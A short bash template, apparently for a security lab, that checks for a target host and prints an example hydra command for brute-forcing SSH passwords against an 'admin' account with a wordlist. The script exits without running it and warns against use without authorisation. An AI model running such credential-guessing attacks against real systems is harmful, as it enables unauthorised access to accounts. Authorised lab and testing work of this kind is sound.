#!/usr/bin/env bash
# PLANTILLA — revisar credenciales y política del laboratorio antes de usar.
# Requiere hydra y un servidor SSH en TARGET_HOST.
set -euo pipefail
: "${TARGET_HOST:?Set TARGET_HOST}"
echo "[brute_force_ssh] Descomentar y ajustar usuario/lista en este script." >&2
echo "Ejemplo (NO ejecutar sin autorización):" >&2
echo "  hydra -l admin -P /ruta/wordlist.txt ssh://$TARGET_HOST -t 4 -f" >&2
exit 0
